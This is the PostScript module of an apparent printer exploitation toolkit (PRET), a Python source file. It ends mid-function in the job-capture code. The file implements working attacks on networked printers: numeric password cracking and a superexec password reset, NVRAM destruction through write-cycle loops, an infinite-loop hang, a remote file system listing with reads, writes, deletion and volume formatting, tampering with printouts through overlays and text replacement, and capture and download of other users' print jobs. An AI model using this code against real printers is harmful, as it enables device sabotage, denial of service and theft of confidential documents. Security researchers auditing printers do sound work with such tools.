#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# python standard library
import re, os, sys, string, random, json, collections
from typing import List, Tuple, Union, cast

# local pret classes
from printer import printer
from operators import operators
from helper import log, output, conv, file, item, const as c

class postscript(printer):
  # --------------------------------------------------------------------
  # send PostScript command to printer, optionally receive response
  def cmd(self, bytes_send: bytes, fb=True, crop=True, binary=False, *args, **kwargs) -> bytes:
    bytes_recv = b"" # response buffer
    if self.iohack: bytes_send = b'{' + bytes_send + b'} stopped' # br-script workaround
    token: bytes = c.DELIMITER + str(random.randrange(2**16)).encode() # unique response delimiter
    iohack: bytes = c.PS_IOHACK if self.iohack else b''   # optionally include output hack
    footer: bytes = b'\n(' + token + b'\\n) print flush\n' # additional line feed necessary
    # send command to printer device              # to get output on some printers
    try:
      cmd_send = c.UEL + c.PS_HEADER + iohack + bytes_send + footer # + c.UEL
      # write to logfile
      log().write(self.logfile, bytes_send.decode() + os.linesep)
      # sent to printer
      self.send(cmd_send)
      # use random token or error message as delimiter PS responses
      bytes_recv = self.recv(token + rb".*$" + rb"|" + c.PS_FLUSH, fb, crop, binary)
      return self.ps_err(bytes_recv)

    # handle CTRL+C and exceptions
    except (KeyboardInterrupt, Exception) as e:
      if self.exceptions and not isinstance(e, KeyboardInterrupt):
        raise
      self.reconnect(str(e))
      return b""

  # send PostScript command, cause permanent changes
  def globalcmd(self, bytes_send: bytes, *stuff):
    return self.cmd(c.PS_GLOBAL + bytes_send, *stuff)

  # send PostScript command, bypass invalid access
  def supercmd(self, bytes_send: bytes, *stuff):
    return self.cmd(b'{' + bytes_send + b'}' + c.PS_SUPER, *stuff)

  # handle error messages from PostScript interpreter
  def ps_err(self, bytes_recv: bytes) -> bytes:
    self.error = None
    msg = item(re.findall(c.PS_ERROR, bytes_recv))
    if msg: # real postscript command errors
      output().errmsg("PostScript Error", msg)
      self.error = msg
      bytes_recv = b""
    else: # printer errors or status messages
      msg = item(re.findall(c.PS_CATCH, bytes_recv))
      if msg:
        self.chitchat("Status Message: '" + msg.strip() + "'")
        bytes_recv = re.sub(rb'' + c.PS_CATCH + rb'\r?\n', b'', bytes_recv)
    return bytes_recv

  # disable printing hard copies of error messages
  def on_connect(self, mode):
    if mode == 'init': # only for the first connection attempt
      bytes_send = b'(x1) = (x2) ==' # = original, == overwritten
      bytes_send += b' << /DoPrintErrors false >> setsystemparams'
      bytes_recv = self.cmd(bytes_send)
      #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
      # handle devices that do not support ps output via 'print' or '=='
      if b'x1' in bytes_recv or self.error: self.iohack = False # all fine
      elif b'x2' in bytes_recv: # hack required to get output (e.g. brother)
        output().errmsg('Crippled feedback', '%stdout hack enabled')
      else: # busy or not a PS printer or a silent one (e.g. Dell 3110cn)
        output().errmsg('No feedback', 'Printer busy, non-ps or silent')

  # ------------------------[ shell ]-----------------------------------
  def do_shell(self, arg: str):
    "Open interactive PostScript shell."
    # politely request poor man's remote postscript shell
    output().info("Launching PostScript shell. Press CTRL+D to exit.")
    try:
      self.send(c.UEL + c.PS_HEADER + b"false echo executive\n")
      while True:
        # use postscript prompt or error message as delimiter
        bytes_recv = self.recv(c.PS_PROMPT + b"$|" + c.PS_FLUSH, False, False)
        # output raw response from printer
        output().raw(bytes_recv, "")
        # break on postscript error message
        if re.search(c.PS_FLUSH, bytes_recv): break
        # fetch user input and send it to postscript shell
        self.send(eval(input("")) + "\n")
    # handle CTRL+C and exceptions
    except (EOFError, KeyboardInterrupt) as e:
      pass
    # reconnect with new conn object
    self.reconnect(None)

  # --------------------------------------------------------------------
  # check if remote volume exists
  def volumes(self) -> List[bytes]:
    bytes_recv = self.cmd(b'/str 128 string def (*)'
             + b'{print (\\n) print} str devforall')
    vols = bytes_recv.splitlines() + [b'%*%']
    return vols # return list of existing vols

  def vol_exists(self, vol: bytes):
    vol = b'%' + vol.strip(b'%') + b'%'
    return vol in self.volumes() # return availability

  # check if remote directory exists
  def dir_exists(self, path: bytes, list=[]):
    path = self.escape(path)
    if self.fuzz and not list: # use status instead of filenameforall
      return (self.file_exists(path) != c.NONEXISTENT)
    # use filenameforall as some ps interpreters do not support status
    if not list: list = self.dirlist(path, r=False)
    for name in list: # use dirlist to check if directory
      if re.search(b"^(%.*%)?" + path + c.SEP, name): return True

  # get remote file data if possible
  def ls_file_data(self, path: bytes) -> Union[int, Tuple[str, str, str]]:
    bytes_recv = self.cmd(b'(' + path + b') status dup '
             + b'{pop == == == ==} if', False)
    meta = bytes_recv.splitlines()
    # standard conform ps interpreters respond with file size + timestamps
    if len(meta) == 4:
      # timestamps however are often mixed up…
      timestamps = [conv().int(meta[0]), conv().int(meta[1])]
      otime = conv().lsdate(min(timestamps)) # created (may also be ctime)
      mtime = conv().lsdate(max(timestamps)) # last referenced for writing
      size  = str(conv().int(meta[2]))       # bytes (file/directory size)
      pages = str(conv().int(meta[3]))       # pages (ain't really useful)
      return (size, otime, mtime)
    # broken interpreters return true only; can also mean: directory
    elif item(meta) == 'true': return c.FILE_EXISTS
    else: return c.NONEXISTENT

  # check if remote file exists and get its size
  def file_exists(self, path: bytes) -> int:
    metadata = self.ls_file_data(path)
    if isinstance(metadata, int):
      return metadata
    size, otime, mtime = metadata
    return int(size)

  # escape postscript pathname
  def escape(self, path: bytes) -> bytes:
    return path.replace(b'\\', b'\\\\').replace(b'(', rb'\(').replace(b')', rb'\)')

  #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
  # get complete list of files and directories on remote device
  def dirlist(self, path: bytes=b"", r=True) -> List[bytes]:
    if r: path = self.rpath(path)
    path = self.escape(path + self.get_sep(path))
    vol = b"" if self.vol else b"%*%" # search any volume if none specified
    # also lists hidden .dotfiles + special treatment for brother devices
    bytes_recv = self.find(vol + path + b"**") or self.find(vol + path + b"*")
    list = {name for name in bytes_recv.splitlines()}
    return sorted(list)

  def find(self, path: bytes) -> bytes:
    bytes_send = b'{false statusdict /setfilenameextend get exec} stopped\n'\
                 b'/str 256 string def (' + path + b') '\
                 b'{print (\\n) print} str filenameforall'
    return self.timeoutcmd(bytes_send, self.timeout * 2, False)

  # ------------------------[ ls <path> ]-------------------------------
  def do_ls(self, arg: str):
    "List contents of remote directory:  ls <path>"
    path = self.rpath(arg.encode()) + self.get_sep(arg.encode())
    list = self.dirlist(arg.encode())
    cwdlist = []
    # create file list without subdirs
    for name in list:
      max = len(path.split(c.SEP))
      name = c.SEP.join(name.split(c.SEP)[:max])
      # add new and non-empty filenames to list
      if not name in cwdlist and re.sub(b"^(%.*%)", b'', name):
        cwdlist.append(name)
    # get metadata for files in cwd
    for name in cwdlist:
      isdir = self.dir_exists(name, list) # check if file is directory
      metadata = self.ls_file_data(name) if not isdir else None
      have_metadata = False
      size, otime, mtime = None, None, None
      if metadata == c.FILE_EXISTS or isdir: # create dummy metadata
        (size, otime, mtime) = ('-', conv().lsdate(0), conv().lsdate(0))
        have_metadata = True
      elif metadata != c.NONEXISTENT and isinstance(metadata, tuple):
        size, otime, mtime = metadata
        have_metadata = True
      if have_metadata: # we got real or dummy metadata
        output().psdir(isdir, size, otime, self.basename(name).decode(), mtime)
      else: output().errmsg("Crippled filename", 'Bad interpreter')

  # ------------------------[ find <path> ]-----------------------------
  def do_find(self, arg: str):
    "Recursively list contents of directory:  find <path>"
    for name in self.dirlist(arg.encode()):
      output().psfind(name)

  # ------------------------[ mirror <path> ]---------------------------
  def do_mirror(self, arg: str):
    "Mirror remote file system to local directory:  mirror <remote path>"
    for name in self.dirlist(arg.encode()):
      self.mirror(name, True)

  # ====================================================================

  # ------------------------[ mkdir <path> ]----------------------------
  def do_mkdir(self, arg: str):
    "Create remote directory:  mkdir <path>"
    if not arg:
      arg = eval(input("Directory: "))
    # writing to dir/file should automatically create dir/
    # .dirfile is not deleted as empty dirs are not listed
    self.put(self.rpath(arg.encode()) + c.SEP + b'.dirfile', '')

  # ------------------------[ get <file> ]------------------------------
  def get(self, path: bytes, size=None) -> Union[int, Tuple[int, bytes]]:
    if not size:
      size = self.file_exists(path)
    if size != c.NONEXISTENT:
      # read file, one byte at a time
      bytes_recv = self.cmd(b'/byte (0) def\n'
                        + b'/infile (' + path + b') (r) file def\n'
                        + b'{infile read {byte exch 0 exch put\n'
                        + b'(%stdout) (w) file byte writestring}\n'
                        + b'{infile closefile exit} ifelse\n'
                        + b'} loop', True, True, True)
      return (size, bytes_recv)
    else:
      print("File not found.")
      return c.NONEXISTENT

  # ------------------------[ put <local file> ]------------------------
  def put(self, path, data, mode='w+'):
    if self.iohack: # brother devices without any writeable volumes
      output().warning("Writing will probably fail on this device")
    # convert to PostScript-compatibe octal notation
    data = ''.join(['\\{:03o}'.format(ord(char)) for char in data])
    self.cmd('/outfile (' + path + ') (' + mode + ') file def\n'
           + 'outfile (' + data + ') writestring\n'
           + 'outfile closefile\n', False)

  # ------------------------[ append <file> <string> ]------------------
  def append(self, path, data):
    self.put(path, data, 'a+')

  # ------------------------[ delete <file> ]---------------------------
  def delete(self, arg: bytes):
    path = self.rpath(arg)
    self.cmd(b'(' + path + b') deletefile', False)

  # ------------------------[ rename <old> <new> ]----------------------
  def do_rename(self, arg: str):
    args = re.split(r"\s+", arg, 1)
    if len(args) > 1:
      old = self.rpath(args[0].encode())
      new = self.rpath(args[1].encode())
      self.cmd(b'(' + old + b') (' + new + b') renamefile', False)
    else:
      self.onecmd("help rename")

  # define alias but do not show alias in help
  do_mv = do_rename
  def help_rename(self):
    print("Rename remote file:  rename <old> <new>")

  # ====================================================================

  # ------------------------[ id ]--------------------------------------
  def do_id(self, *arg):
    "Show device information."
    output().info(self.cmd(b'product print').decode())

  # ------------------------[ version ]---------------------------------
  def do_version(self, *arg):
    "Show PostScript interpreter version."
    bytes_send = b'(Dialect:  ) print\n'\
      b'currentpagedevice dup (PostRenderingEnhance) known {(Adobe\\n)   print}\n'\
      b'{serverdict       dup (execkpdlbatch)        known {(KPDL\\n)    print}\n'\
      b'{statusdict       dup (BRversion)            known {(BR-Script ) print\n'\
      b'/BRversion get ==}{(Unknown) print} ifelse} ifelse} ifelse\n'\
      b'currentsystemparams 11 {dup} repeat\n'\
      b'                     (Version:  ) print version           ==\n'\
      b'                     (Level:    ) print languagelevel     ==\n'\
      b'                     (Revision: ) print revision          ==\n'\
      b'                     (Serial:   ) print serialnumber      ==\n'\
      b'/SerialNumber known {(Number:   ) print /SerialNumber get ==} if\n'\
      b'/BuildTime    known {(Built:    ) print /BuildTime    get ==} if\n'\
      b'/PrinterName  known {(Printer:  ) print /PrinterName  get ==} if\n'\
      b'/LicenseID    known {(License:  ) print /LicenseID    get ==} if\n'\
      b'/PrinterCode  known {(Device:   ) print /PrinterCode  get ==} if\n'\
      b'/EngineCode   known {(Engine:   ) print /EngineCode   get ==} if'
    output().info(self.cmd(bytes_send))

  # ------------------------[ df ]--------------------------------------
  def do_df(self, arg: str):
    "Show volume information."
    output().df(('VOLUME', 'TOTAL SIZE', 'FREE SPACE', 'PRIORITY',
    'REMOVABLE', 'MOUNTED', 'HASNAMES', 'WRITEABLE', 'SEARCHABLE'))
    for vol in self.volumes():
      bytes_send = b'(' + vol + b') devstatus dup {pop ' + b'== ' * 8 + b'} if'
      lst_recv = self.cmd(bytes_send).decode().splitlines()
      values = (vol.decode(),) + tuple(lst_recv if len(lst_recv) == 8 else ['-'] * 8)
      output().df(values)

  # ------------------------[ free ]------------------------------------
  def do_free(self, arg: str):
    "Show available memory."
    #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    output().raw("RAM status")
    output().info(self.cmd(b'currentsystemparams dup dup dup\n'
                         + b'/mb 1048576 def /kb 100 def /str 32 string def\n'
                         + b'(size:   ) print /InstalledRam known {\n'
                         + b'  /InstalledRam get dup mb div cvi str cvs print (.) print kb mod cvi str cvs print (M\\n) print}{pop (Not available\\n) print\n'
                         + b'} ifelse\n'
                         + b'(free:   ) print /RamSize known {\n'
                         + b'  /RamSize get dup mb div cvi str cvs print (.) print kb mod cvi str cvs print (M\\n) print}{pop (Not available\\n) print\n'
                         + b'} ifelse'))
    #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    output().raw("Virtual memory")
    output().info(self.cmd(b'vmstatus\n'
                         + b'/mb 1048576 def /kb 100 def /str 32 string def\n'
                         + b'(max:    ) print dup mb div cvi str cvs print (.) print kb mod cvi str cvs print (M\\n) print\n'
                         + b'(used:   ) print dup mb div cvi str cvs print (.) print kb mod cvi str cvs print (M\\n) print\n'
                         + b'(level:  ) print =='))
    #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    output().raw("Font cache")
    output().info(self.cmd(b'cachestatus\n'
                         + b'/mb 1048576 def /kb 100 def /str 32 string def\n'
                         + b'(blimit: ) print ==\n'
                         + b'(cmax:   ) print ==\n'
                         + b'(csize:  ) print ==\n'
                         + b'(mmax:   ) print ==\n'
                         + b'(msize:  ) print ==\n'
                         + b'(bmax:   ) print ==\n'
                         + b'(bsize:  ) print =='))
    #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    output().raw("User cache")
    output().info(self.cmd(b'ucachestatus\n'
                         + b'/mb 1048576 def /kb 100 def /str 32 string def\n'
                         + b'(blimit: ) print ==\n'
                         + b'(rmax:   ) print ==\n'
                         + b'(rsize:  ) print ==\n'
                         + b'(bmax:   ) print ==\n'
                         + b'(bsize:  ) print =='))

  # ------------------------[ devices ]---------------------------------
  def do_devices(self, arg: str):
    "Show available I/O devices."
    bytes_send = b'/str 128 string def (*) {print (\\n) print} str /IODevice resourceforall'
    for dev in self.cmd(bytes_send).splitlines():
      output().info(dev)
      output().raw(self.cmd(b'(' + dev + b') currentdevparams {exch 128 string '
                          + b'cvs print (: ) print ==} forall').decode() + os.linesep)

  # ------------------------[ uptime ]----------------------------------
  def do_uptime(self, arg: str):
    "Show system uptime (might be random)."
    bytes_recv = self.cmd(b'realtime ==')
    try: output().info(conv().elapsed(bytes_recv, 1000))
    except ValueError: output().info("Not available")

  # ------------------------[ date ]------------------------------------
  def do_date(self, arg: str):
    "Show printer's system date and time."
    bytes_send = b'(%Calendar%) /IODevice resourcestatus\n'\
                 b'{(%Calendar%) currentdevparams /DateTime get print}\n'\
                 b'{(Not available) print} ifelse'
    bytes_recv = self.cmd(bytes_send)
    output().info(bytes_recv)

  # ------------------------[ pagecount ]-------------------------------
  def do_pagecount(self, arg: str):
    "Show printer's page counter:  pagecount <number>"
    output().raw("Hardware page counter: ", '')
    bytes_send = b'currentsystemparams dup /PageCount known\n'\
                 b'{/PageCount get ==}{(Not available) print} ifelse'
    output().info(self.cmd(bytes_send))

  # ====================================================================

  # ------------------------[ lock <passwd> ]---------------------------
  def do_lock(self, arg: str):
    "Set startjob and system parameters password."
    if not arg:
      arg = eval(input("Enter password: "))
    a = arg.encode()
    self.cmd(b'<< /Password () '
             b'/SystemParamsPassword (' + a + b') ' # harmless settings
             b'/StartJobPassword (' + a + b') '     # alter initial vm!
             b'>> setsystemparams', False)

  # ------------------------[ unlock <passwd>|"bypass" ]----------------
  def do_unlock(self, arg: str):
    "Unset startjob and system parameters password."
    max = 2**20 # exhaustive key search max value
    # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    # note that only numeric passwords can be cracked right now
    # according to the reference using 'reset' should also work:
    # **********************************************************
    # »if the system parameter password is forgotten, there is
    # still a way to reset it [...] by passing a dictionary to
    # setsystemparams in which FactoryDefaults is the only entry«
    # **********************************************************
    if not arg:
      print("No password given, cracking.") # 140k tries/sec on lj4250!
      output().chitchat("If this ain't successful, try 'unlock bypass'")
      a = self.timeoutcmd(b'/min 0 def /max ' + str(max).encode() + b' def\n'
              b'statusdict begin {min 1 max\n'
              b'  {dup checkpassword {== flush stop}{pop} ifelse} for\n'
              b'} stopped pop', self.timeout * 100)
      if a:
        arg = a.decode()
    # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    # superexec can be used to reset PostScript passwords on most devices
    elif arg == 'bypass':
      print("Resetting password to zero with super-secret PostScript magic")
      self.supercmd(b'<< /SystemParamsPassword (0)'
                    b' /StartJobPassword (0) >> setsystemparams')
      arg = '0' # assume we have successfully reset the passwords to zero
    # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    # finally unlock device with user-supplied or cracked password
    bytes_recv = self.cmd(b'{ << /Password (' + arg.encode() + b')\n'
                          b'  /SystemParamsPassword ()\n' # mostly harmless
                          b'  /StartJobPassword ()\n' # permanent VM change
                          b'  >> setsystemparams\n} stopped ==')
    msg = "Use the 'reset' command to restore factory defaults"
    if not b'false' in bytes_recv: output().errmsg("Cannot unlock", msg)
    else: output().raw("Device unlocked with password: " + arg)

  # ------------------------[ restart ]---------------------------------
  def do_restart(self, arg: str):
    "Restart PostScript interpreter."
    output().chitchat("Restarting PostScript interpreter.")
    # reset VM, might delete downloaded files and/or restart printer
    self.globalcmd(b'systemdict /quit get exec')

  # ------------------------[ reset ]-----------------------------------
  def do_reset(self, arg: str):
    "Reset PostScript settings to factory defaults."
    # reset system parameters -- only works if printer is turned off
    ''' »A flag that, if set to true immediately before the printer is turned
    off, causes all nonvolatile parameters to revert to their factory default
    values at the next power-on. The set of nonvolatile parameters is product
    dependent. In most products, 'PageCount' cannot be reset. If the job that
    sets FactoryDefaults to true is not the last job executed straight before
    power-off, the request is ignored; this reduces the chance that malicious
    jobs will attempt to perform this operation.« '''
    self.cmd(b'<< /FactoryDefaults true >> setsystemparams', False)
    output().raw("Printer must be turned off immediately for changes to take effect.")
    output().raw("This can be accomplished, using the 'restart' command in PJL mode.")

  # ------------------------[ format ]----------------------------------
  def do_format(self, arg: str):
    "Initialize printer's file system:  format <disk>"
    if not self.vol:
      output().info("Set volume first using 'chvol'")
    else:
      output().warning("Warning: Initializing the printer's file system will whipe-out all")
      output().warning("user data (e.g. stored jobs) on the volume. Press CTRL+C to abort.")
      if output().countdown("Initializing " + self.vol.decode() + " in...", 10, self):
        bytes_recv = self.cmd(b'statusdict begin (' + self.vol + b') () initializedisk end', False)

  # ------------------------[ disable ]---------------------------------
  def do_disable(self, arg: str):
    output().psonly()
    before = b'true' in self.globalcmd(b'userdict /showpage known dup ==\n'
                                       b'{userdict /showpage undef}\n'
                                       b'{/showpage {} def} ifelse')
    after = b'true' in self.cmd(b'userdict /showpage known ==')
    if before == after: output().info("Not available") # no change
    elif before: output().info("Printing is now enabled")
    elif after: output().info("Printing is now disabled")

  # define alias but do not show alias in help
  do_enable = do_disable
  def help_disable(self):
    print("Disable printing functionality.")

  # ------------------------[ destroy ]---------------------------------
  def do_destroy(self, arg: str):
    "Cause physical damage to printer's NVRAM."
    output().warning("Warning: This command tries to cause physical damage to the")
    output().warning("printer NVRAM. Use at your own risk. Press CTRL+C to abort.")
    if output().countdown("Starting NVRAM write cycle loop in...", 10, self):
      '''
      ┌───────────────────────────────────────────────────────────┐
      │               how to destroy your printer?                │
      ├───────────────────────────────────────────────────────────┤
      │ Older devices allow us to set system parameters within a  │
      │ PostScript loop. New devices only write to the NVRAM once │
      │ the print job finishes which slows down NVRAM exhaustion. │
      │ To get the best of both worlds, we use a hybrid approach. │
      ├───────────────────────────────────────────────────────────┤
      │ Note that this will only work if /WaitTimeout survives a  │
      │ reboot. Else we should use the /StartJobPassword instead. │
      └───────────────────────────────────────────────────────────┘
      '''
      cycles = b'100' # number of nvram write cycles per loop
                     # large values kill old printers faster
      for n in range(1, 1000000):
        self.globalcmd(b'/value {currentsystemparams /WaitTimeout get} def\n'
                       b'/count 0 def /new {count 2 mod 30 add} def\n'
                       b'{ << /WaitTimeout new >> setsystemparams\n'
                       b'  /count count 1 add def % increment\n'
                       b'  value count ' + cycles + b' eq {exit} if\n'
                       b'} loop', False)
        self.chitchat("\rNVRAM write cycles: " + str(n*int(cycles)), '')
      print() # echo newline if we get this far

  # ------------------------[ hang ]------------------------------------
  def do_hang(self, arg: str):
    "Execute PostScript infinite loop."
    output().warning("Warning: This command causes an infinite loop rendering the")
    output().warning("device useless until manual restart. Press CTRL+C to abort.")
    if output().countdown("Executing PostScript infinite loop in...", 10, self):
      self.cmd(b'{} loop', False)

  # ====================================================================

  # ------------------------[ overlay <file> ]--------------------------
  def do_overlay(self, arg: str):
    "Put overlay image on all hard copies:  overlay <file>"
    if not arg: arg = eval(input('File: '))
    if arg.endswith('ps'): data = file().read(arg) # already ps/eps file
    else:
      self.chitchat("For best results use a file from the overlays/ directory")
      data = self.convert(arg, 'eps') # try to convert other file types
    if data: self.overlay(data)

  # define alias
  complete_overlay = printer.complete_lfiles # files or directories

  def overlay(self, data):
    output().psonly()
    size = str(conv().filesize(len(data))).strip()
    self.chitchat("Injecting overlay data (" + size + ") into printer memory")
    bytes_send = b'{overlay closefile} stopped % free memory\n' \
                 b'/overlay systemdict /currentfile get exec\n' \
                 + str(len(data)).encode() + b' () /SubFileDecode filter\n' \
                 b'/ReusableStreamDecode filter\n' + data + b'\n' \
                 b'def % --------------------------------------\n' \
                 b'/showpage {save /showpage {} def overlay dup\n' \
                 b'0 setfileposition cvx exec restore systemdict\n' \
                 b'/showpage get exec} def'
    self.globalcmd(bytes_send)

  # ------------------------[ cross <text> <font> ]---------------------
  def do_cross(self, arg: str):
    args = re.split(r"\s+", arg, 1)
    if len(args) > 1 and args[0] in self.options_cross:
      font, text = args
      text = text.strip('"')
      data = file().read(self.fontdir + font + ".pfa") or b""
      data += b'\n/' + font.encode() + b' findfont 50 scalefont setfont\n'\
              b'80 185 translate 52.6 rotate 1.1 1 scale 275 -67 moveto\n'\
              b'(' + text.encode()  + b') dup stringwidth pop 2 div neg 0 rmoveto show'
      self.overlay(data)
    else:
      self.onecmd("help cross")

  def help_cross(self):
    print("Put printer graffiti on all hard copies:  cross <font> <text>")
    print("Read the docs on how to install custom fonts. Available fonts:")
    last = None
    if len(self.options_cross) > 0: last = sorted(self.options_cross)[-1]
    for font in sorted(self.options_cross): print((('└─ ' if font == last else '├─ ') + font))

  fontdir = os.path.dirname(os.path.realpath(__file__))\
          + os.path.sep + 'fonts' + os.path.sep
  options_cross = [os.path.splitext(font)[0] for font in (os.listdir(fontdir)
                  if os.path.exists(fontdir) else []) if font.endswith('.pfa')]

  def complete_cross(self, text, line, begidx, endidx):
    return [cat for cat in self.options_cross if cat.startswith(text)]

  # ------------------------[ replace <old> <new> ]---------------------
  def do_replace(self, arg: str):
    "Replace string in documents to be printed:  replace <old> <new>"
    args = re.split(r"\s+", arg, 1)
    if len(args) > 1:
      output().psonly()
      oldstr, newstr = self.escape(args[0].encode()), self.escape(args[1].encode())
      self.globalcmd(b'/strcat {exch dup length 2 index length add string dup\n'
                     b'dup 4 2 roll copy length 4 -1 roll putinterval} def\n'
                     b'/replace {exch pop (' + newstr + b') exch 3 1 roll exch strcat strcat} def\n'
                     b'/findall {{(' + oldstr + b') search {replace}{exit} ifelse} loop} def\n'
                     b'/show       {      findall       systemdict /show       get exec} def\n'
                     b'/ashow      {      findall       systemdict /ashow      get exec} def\n'
                     b'/widthshow  {      findall       systemdict /widthshow  get exec} def\n'
                     b'/awidthshow {      findall       systemdict /awidthshow get exec} def\n'
                     b'/cshow      {      findall       systemdict /cshow      get exec} def\n'
                     b'/kshow      {      findall       systemdict /kshow      get exec} def\n'
                     b'/xshow      { exch findall exch  systemdict /xshow      get exec} def\n'
                     b'/xyshow     { exch findall exch  systemdict /xyshow     get exec} def\n'
                     b'/yshow      { exch findall exch  systemdict /yshow      get exec} def\n')
    else:
      self.onecmd("help replace")

  # ------------------------[ capture <operation> ]---------------------
  def do_capture(self, arg: str):
    "Capture further jobs to be printed on this device."
    free = b'5' # memory limit in megabytes that must at least be free to capture print jobs
    # record future print jobs
    if arg.startswith('start'):
      output().psonly()
      # PRET commands themself should not be capture if they're performed within ≤ 10s idle
      '''
      ┌──────────┬───────────────────────────────┬───────────────┐
      │ hooking: │       BeginPage/EndPage       │ overwrite all │
      ├──────────┼───────────────────────────────┼───────────────┤
      │ metadat: │               ✔               │       -       │
      ├──────────┼───────────────────────────────┼───────┬───────┤
      │ globals: │   we are already global(?)    │ need  │ none  │
      ├──────────┼───────────────┬───────────────┼───────┴───────┤
      │ capture: │  currentfile  │   %lineedit   │  currentfile  │
      ├──────────┼───────┬───────┼───────┬───────┼───────┬───────┤
      │ storage: │ nfile │ vfile │ nfile │ array │ vfile │ nfile │
      ├──────────┼───────┼───────┼───────┼───────┼───────┼───────┤
      │ package: │   ✔   │   ?   │   ✔   │   ?   │   ?   │   ✔   │
      ├──────────┼───────┼───────┼───────┼───────┼───────┼───────┤
      │ execute: │   ✔   │   ✔   │   ✔   │   -   │   ✔   │   ✔   │
      └──────────┴───────┴───────┴───────┴───────┴───────┴───────┘
      '''
      bytes_send = b'true 0 startjob {                                                     \n'\
                   b'/setoldtime {/oldtime realtime def} def setoldtime                    \n'\
                   b'/threshold {realtime oldtime sub abs 10000 lt} def                    \n'\
                   b'/free {vmstatus exch pop exch pop 1048576 div '+free+b' ge} def       \n'\
                   b'%---------------------------------------------------------------------\n'\
                   b'%--------------[ get current document as file object ]----------------\n'\
                   b'%---------------------------------------------------------------------\n'\
                   b'/document {(%stdin) (r) file /ReusableStreamDecode filter} bind def   \n'\
                   b'%---------------------------------------------------------------------\n'\
                   b'/capturehook {{                                                       \n'\
                   b'  threshold {(Within threshold - will not capture\\n) print flush     \n'\
                   b'  setoldtime                                                          \n'\
                   b'}{                                                                    \n'\
                   b'  setoldtime                                                          \n'\
                   b'  free not {(Out of memory\\n) print flush}{                          \n'\
                   b'  % (This job will be captured in memory\\n) print flush              \n'\
                   b'  setoldtime                                                          \n'\
                   b'  false echo                            % stop interpreter slowdown   \n'\
                   b'  /timestamp realtime def               % get time from interpreter   \n'\
                   b'  userdict /capturedict known not       % print jobs are saved here   \n'\
                   b'  {/capturedict 50000 dict def} if      % define capture dictionary   \n'\
                   b'  %-------------------------------------------------------------------\n'\
                   b'  %--------------[ save document to dict and print it ]---------------\n'\
                   b'  %-------------------------------------------------------------------\n'\
                   b'  capturedict timestamp document put    % store document in memory    \n'\
                   b'  capturedict timestamp get cvx exec    % print the actual document   \n'\
                   b'  clear cleardictstack                  % restore original vm state   \n'\
                   b'  %-------------------------------------------------------------------\n'\
                   b'  setoldtime                                                          \n'\
                   b'  } ifelse} ifelse} stopped} bind def                                 \n'\
                   b'<< /BeginPage {capturehook} bind >> setpagedevice                     \n'\
                   b'(Future print jobs will be captured in memory!)}                      \n'\
                   b'{(Cannot capture - unlock me first)} ifelse print'
      output().raw(self.cmd(bytes_send))
    #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    # show captured print jobs
    elif arg.startswith('list'):
      # show amount of free virtual memory left to capture print jobs
      vmem = self.cmd(b'vmstatus exch pop exch pop 32 string cvs print')
      output().chitchat("Free virtual memory: " + str(conv().filesize(vmem))
        + " | Limit to capture: " + str(conv().filesize(int(free) * 1048576)))
      output().warning(self.cmd(b'userdict /free known {free not\n'
        b'{(Memory almost full, will not capture jobs anymore) print} if}\n'
        b'{(Capturing print jobs is currently not active) print} ifelse'))
      # get first 100 lines for each captured job
      bytes_recv = self.cmd(
        b'userdict /capturedict known {capturedict\n'
        b'{ exch realtime sub (Date: ) print == dup          % get time diff\n'
        b'  resetfile (Size: ) print dup bytesavailable ==   % get file size\n'
        b'  100 {dup 128 string readline {(%%) anchorsearch  % get metadata\n'
        b'  {exch print (\\n) print} if pop}{pop exit} ifelse} repeat pop\n'
        b'  (' + c.DELIMITER + b'\\n) print\n'
        b'} forall clear} if')
      # grep for metadata in captured jobs
      listed_jobs: List[Tuple] = []
      for val in [_f for _f in bytes_recv.split(c.DELIMITER) if _f]:
        date = conv().timediff(item(re.findall(b'Date: (.*)', val)))
        size = conv().filesize(item(re.findall(b'Size: (.*)', val)))
        user = item(re.findall(b'For: (.*)', val))
        name = item(re.findall(b'Title: (.*)', val))
        soft = item(re.findall(b'Creator: (.*)', val))
        listed_jobs.append((date, size, user, name, soft))
      # output metadata for captured jobs
      if listed_jobs:
        output().joblist(('date', 'size', 'user', 'jobname', 'creator'))
        output().hline(79)
        for listed_job in listed_jobs: output().joblist(listed_job)
    #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    # save captured print jobs
    elif arg.startswith('fetch'):
      fetched_jobs: List[bytes] = self.cmd(b'userdict /capturedict known {capturedict {exch ==} forall} if').splitlines()
      if not fetched_jobs: output().raw("No jobs captured")
      else:
        for fetched_job in fetched_jobs:
          # is basename sufficient to sanatize file names? we'll see…
          target, fetched_job_base = self.basename(self.target), self.basename(fetched_job)
          root = os.path.join(b'capture', target)
          lpath = os.path.join(root, fetched_job_base + b'.ps')
          self.makedirs(root)
          # download captured job
          output().raw("Receiving " + lpath.decode())
          data = b'%!\n'
          data += self.cmd(b'/byte (0) def\n'
            b'capturedict ' + fetched_job_base + b' get dup resetfile\n'
            b'{dup read {byte exch 0 exch put\n'
            b'(%stdout) (w) file byte writestring}\n'
            b'{exit} ifelse} loop')
          data = conv().nstrip_bytes(data) # remove carriage return chars
          print((str(len(data)) + " bytes received."))
          # write to local file
          if lpath and data: file().write(lpath, data)
      # be user-friendly and show some info on how to open captured jobs
      reader = 'any PostScript reader'
      if sys.platform == 'darwin': reader = 'Preview.app'       # OS X
      if sys.platform.startswith('linux'): reader = 'Evince'    # Linux
      if sys.platform in ['win32', 'cygwin']: reader = 'GSview' # Windows
      self.chitchat("Saved jobs can be opened with " + reader)
    #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    # reprint saved print jobs
    elif arg.endswith('print'):
      output().raw(self.cmd(
       b'/str 256 string def /count 0 def\n'
       b'/increment {/count 1 count add def} def\n'
